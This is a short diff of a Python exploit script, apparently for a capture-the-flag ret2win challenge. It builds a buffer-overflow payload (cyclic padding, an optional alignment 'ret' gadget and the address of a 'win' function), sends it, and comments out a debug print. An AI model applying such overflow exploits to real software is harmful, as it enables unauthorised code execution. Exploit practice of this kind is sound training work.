@@ -53,7 +53,7 @@ def exploit(binary: str, movaps, times):
     if movaps:
         chain += p64(r.find_gadget(['ret'])[0])
     chain += p64(e.sym['win'] + 1)
-    print(chain)
+    #print(chain)
     print(cyclic(offset) + chain)
     s.sendline(cyclic(offset) + chain)
     try:
